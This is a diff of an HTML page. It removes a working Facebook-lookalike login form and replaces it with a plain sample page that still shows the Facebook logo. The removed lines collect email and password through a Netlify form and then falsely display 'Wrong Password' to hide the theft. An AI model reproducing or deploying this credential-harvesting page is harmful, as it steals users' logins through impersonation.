@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Facebook Login Duplicate</title>
+    <title>Sample Page</title>
     <!-- Add Font Awesome CDN -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <style>
@@ -77,143 +77,11 @@
             height: 100%;
             object-fit: cover;
         }
-        .form-group {
-            position: relative;
-            margin-bottom: 1rem;
-            width: 100%;
-            display: flex;
-            justify-content: center;
-            overflow: visible;
-        }
-        .input-field {
-            width: 100%;
-            max-width: 550px;
-            padding: 1rem 2.5rem 1rem 1rem;
-            background-color: #fff;
-            border: 1px solid #ccd0d5;
-            border-radius: 6px;
-            color: #1c1e21;
-            font-size: 1rem;
-            box-sizing: border-box;
-            height: 3rem;
-            transition: height 0.2s ease, border-color 0.2s ease;
-            margin: 0 auto;
-        }
-        .input-field:focus,
-        .input-field:not(:placeholder-shown) {
-            height: 4rem;
-            border-color: #000000;
-            outline: none;
-        }
-        .input-field:blur:not(:placeholder-shown) {
-            height: 3rem;
-        }
-        .input-field::placeholder {
-            color: #8f949c;
-            opacity: 0;
-        }
-        .floating-label {
-            position: absolute;
-            left: 1rem;
-            top: 0.5rem;
-            color: #8f949c;
-            font-size: 1rem;
-            pointer-events: none;
-            z-index: 1;
-            opacity: 1;
-            transition: top 0.2s ease;
-        }
-        .input-field:focus ~ .floating-label,
-        .input-field:not(:placeholder-shown) ~ .floating-label {
-            top: 0.25rem;
-        }
-        .info-icon {
-            position: absolute;
-            right: 0.75rem;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 1rem;
-            height: 1rem;
-            background-color: #e4e6ea;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 0.625rem;
-            color: #65676b;
-            cursor: pointer;
-            z-index: 1;
-        }
-        .password-icon {
-            position: absolute;
-            right: 0.75rem;
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
-            font-size: 1.25rem;
-            color: #808080;
-            display: none;
-        }
-        .password-group .input-field:not(:placeholder-shown) ~ .password-icon {
-            display: block;
-        }
-        .login-button {
-            width: 100%;
-            padding: 0.75rem;
-            background-color: #1877f2;
-            color: #fff;
-            border: none;
-            border-radius: 30px;
-            font-size: 1.125rem;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 0 auto 1rem;
-        }
-        .forgot-password {
+        .content {
             text-align: center;
-            color: black;
-            font-size: 0.875rem;
-            text-decoration: none;
-            display: block;
-            margin-bottom: 8rem;
+            font-size: 1.2rem;
+            color: #333;
         }
-        .create-account {
-            width: 100%;
-            padding: 0.75rem;
-            background: #fff;
-            color: #1877f2;
-            border: 1px solid #1877f2;
-            border-radius: 20px;
-            font-size: 1rem;
-            cursor: pointer;
-            margin: 0 auto 1rem;
-        }
-        .example-link {
-            text-align: center;
-            margin-top: 0rem;
-        }
-        .example-link img {
-            max-width: 4.5rem;
-            height: auto;
-        }
-        .password-group .input-field {
-            padding: 1rem 2.5rem 1rem 1rem;
-        }
-        .form-message {
-            text-align: center;
-            margin: 1rem 0;
-            font-size: 1rem;
-            display: none;
-        }
-        .form-message.success {
-            color: #dc3545; /* Changed to red */
-            display: block;
-        }
-        .form-message.error {
-            color: #dc3545;
-            display: block;
-        }
-
         /* Media Queries for Desktop */
         @media (min-width: 768px) {
             .container {
@@ -239,56 +107,14 @@
                 height: 4rem;
                 margin-bottom: 6rem;
             }
-            .input-field {
-                width: 100%;
-                max-width: 660px;
-                font-size: 1.125rem;
-                height: 3.5rem;
-            }
-            .input-field:focus,
-            .input-field:not(:placeholder-shown) {
-                height: 4.5rem;
-            }
-            .input-field:blur:not(:placeholder-shown) {
-                height: 3.5rem;
-            }
-            .floating-label {
-                font-size: 1.125rem;
-                left: 1rem;
-            }
-            .info-icon,
-            .password-icon {
-                right: 0.75rem;
-            }
-            .login-button {
-                font-size: 1.25rem;
-                padding: 1rem;
-            }
-            .create-account {
-                font-size: 1.125rem;
-                padding: 1rem;
-            }
-            .forgot-password {
-                font-size: 1rem;
-                margin-bottom: 10rem;
-            }
-            .example-link img {
-                max-width: 5rem;
+            .content {
+                font-size: 1.5rem;
             }
         }
-
         /* Prevent overflow on very small screens */
         @media (max-width: 360px) {
-            .input-field {
-                width: 100%;
-                max-width: none;
-            }
-            .floating-label {
-                left: 1rem;
-            }
-            .info-icon,
-            .password-icon {
-                right: 0.75rem;
+            .content {
+                font-size: 1rem;
             }
         }
     </style>
@@ -305,87 +131,11 @@
             </select>
         </div>
         <a href="#" class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook Logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Logo">
         </a>
-        <form name="login" netlify data-netlify="true" action="#">
-            <input type="hidden" name="form-name" value="login" />
-            <div class="form-group">
-                <input type="text" class="input-field" id="email-input" name="email" placeholder=" " autocomplete="email" required>
-                <label for="email-input" class="floating-label">Mobile number or email</label>
-                <span class="info-icon" aria-label="Information">i</span>
-            </div>
-            <div class="form-group password-group">
-                <input type="password" class="input-field" id="password-input" name="password" placeholder=" " autocomplete="current-password" required>
-                <label for="password-input" class="floating-label">Password</label>
-                <i class="password-icon fa-solid fa-eye" onclick="togglePasswordVisibility('password-input', this)"></i>
-            </div>
-            <div id="form-message" class="form-message"></div>
-            <button type="submit" class="login-button">Log in</button>
-        </form>
-        <a href="#" class="forgot-password">Forgot password?</a>
-        <button class="create-account">Create new account</button>
-        <div class="example-link">
-            <img src="https://raw.githubusercontent.com/hopmos/webimage/main/Metalogo.png" alt="Custom Logo">
+        <div class="content">
+            <p>Welcome to the site! This is a safe and secure page.</p>
         </div>
     </div>
-    <script>
-        function togglePasswordVisibility(inputId, icon) {
-            const input = document.getElementById(inputId);
-            if (input.type === 'password') {
-                input.type = 'text';
-                icon.classList.remove('fa-eye');
-                icon.classList.add('fa-eye-slash');
-            } else {
-                input.type = 'password';
-                icon.classList.remove('fa-eye-slash');
-                icon.classList.add('fa-eye');
-            }
-        }
-
-        document.querySelectorAll('.input-field').forEach(input => {
-            input.addEventListener('focus', function() {
-                if (this.value === '') {
-                    this.style.height = window.innerWidth >= 768 ? '4.5rem' : '4rem';
-                }
-            });
-            input.addEventListener('blur', function() {
-                if (this.value === '') {
-                    this.style.height = window.innerWidth >= 768 ? '3.5rem' : '3rem';
-                }
-            });
-        });
-
-        // Handle form submission with AJAX
-        document.querySelector('form[name="login"]').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const form = e.target;
-            const formData = new FormData(form);
-            const messageDiv = document.getElementById('form-message');
-
-            // Clear previous messages
-            messageDiv.textContent = '';
-            messageDiv.classList.remove('success', 'error');
-
-            try {
-                const response = await fetch('/', {
-                    method: 'POST',
-                    body: formData,
-                });
-
-                if (response.ok) {
-                    messageDiv.textContent = 'Wrong Password';
-                    messageDiv.classList.add('success');
-                    form.reset();
-                } else {
-                    messageDiv.textContent = 'Error submitting form. Please try again.';
-                    messageDiv.classList.add('error');
-                }
-            } catch (error) {
-                console.error('Submission error:', error);
-                messageDiv.textContent = 'An error occurred. Please try again.';
-                messageDiv.classList.add('error');
-            }
-        });
-    </script>
 </body>
 </html>
